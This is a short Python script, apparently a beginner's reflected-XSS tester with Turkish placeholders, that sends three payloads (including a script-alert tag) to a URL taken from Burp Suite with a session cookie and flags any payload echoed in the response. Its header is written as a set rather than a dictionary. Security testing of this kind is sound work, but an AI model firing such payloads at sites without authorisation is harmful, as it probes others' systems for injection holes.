import requests
header = {"burp suite cooki kismi"}
xss_list = ["siber","<h1>siber","<script>alert('siber')</script>"]
for payload in xss_list:
    print(payload)
    url = "burp suite GET kismi" + str(payload)
    sonuc = requests.get(url = url,headers = header)
    if str(payload) in str(sonuc.content):
        print("Muhtemelen XSS var: ",str(payload))